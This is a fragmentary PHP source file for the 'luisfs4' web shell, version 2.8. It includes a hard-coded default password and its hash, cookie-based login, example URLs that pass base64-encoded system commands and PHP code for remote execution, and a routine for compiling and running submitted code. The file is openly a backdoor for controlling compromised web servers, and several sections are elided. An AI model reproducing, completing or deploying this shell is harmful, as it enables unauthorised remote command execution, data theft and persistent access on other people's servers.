...
/*
	...
	Jayalah Indonesiaku
	(c)2013
	http://code.google.com/p/luisfs4-shell
*/
$s_pass = "fb621f5060b9f65acf8eb4232e3024140dea2b34"; // default password : luisfs4 (login and change to new password)

$s_ver = "2.8"; // shell ver
$s_title = "luisfs4 ".$s_ver; // shell title
...
if(strlen(trim($s_pass))>0){
	if(isset($_COOKIE['luisfs4'])){
		if(strtolower(trim($s_pass)) == strtolower(trim($_COOKIE['luisfs4']))) $s_auth = true;
	}
	if(isset($_GP['login'])){
		$s_login = kript($_GP['login']);
		if(strtolower(trim($s_pass)) == $s_login){
			setcookie("luisfs4",$s_login,time() + $s_login_time);
			$s_auth = true;
		}
	}
	if(isset($_GP['x']) && ($_GP['x']=='logout')){
		$persist = array("theme", "cwd");
		$s_reload = (isset($_COOKIE['luisfs4_included']) && isset($_COOKIE['s_home']))? rtrim(urldecode($_COOKIE['s_self']),"&"):"";
...
// this example using password 'luisfs4' in sha1(md5()) format (s_pass=fb621f5060b9f65acf8eb4232e3024140dea2b34)
...
// example:
//		http://www.myserver.com/luisfs4.php?s_pass=fb621f5060b9f65acf8eb4232e3024140dea2b34&cmd=dW5hbWUgLWE=
// next sample will evaluate php code 'phpinfo();' in base64 format (eval=cGhwaW5mbygpOw==)
//		http://www.myserver.com/luisfs4.php?s_pass=fb621f5060b9f65acf8eb4232e3024140dea2b34&eval=cGhwaW5mbygpOw==
...
if(isset($_COOKIE['luisfs4_included'])){
	if(strcmp($s_cek1,$s_cek2)!=0) $s_self = $_COOKIE['s_self'];
	else{
		$s_self = "?";
		setcookie("luisfs4_included", "0" ,time() - $s_login_time);
	...
	if(strcmp($s_cek1,$s_cek2)!=0){
		...
		setcookie("luisfs4_included", "1" ,time() + $s_login_time);
		setcookie("s_self", $s_self ,time() + $s_login_time);
	}
	else{
		$s_self = "?";
		...
		if(isset($_GP['evalcode'])){
			...
			elseif(strtolower($s_lang)=='java'){
				if(preg_match("/class\ ([^{]+){/i",$s_code, $s_r)){
					...
					$s_rand = "luisfs4_".substr(md5(time().rand(0,100)),0,8);
					$s_script = $s_rand;
...
<?php if($s_auth){?>
	...
	<?php }
	?><a href='<?php echo $s_self; ?>x=logout' title='Click me to log out'>log out</a>  <a href='<?php echo $s_self; ?>x=switch' title='Click me to change theme'><span class='schemabox'>&nbsp;&nbsp;</span></a></span><table id='header'><tr><td style='width:80px;'><table><tr><td><h1><a href='<?php echo $s_self."cd=".cp(dirname(realpath($_SERVER['SCRIPT_FILENAME']))); ?>'>luisfs4</a></h1></td></tr><tr><td style='text-align:right;'><div class='ver'><?php echo $s_ver; ?></div></td></tr></table></td>	<td><div class='headinfo'><?php echo $s_info; ?></div></td></tr></table></div>
...
<?php } else{ ?>
	...
	luisfs4&nbsp;<span class='gaya'><?php echo $s_ver; ?></span><input id='login' class='inputz' type='password' name='login' style='width:120px;' value='' />
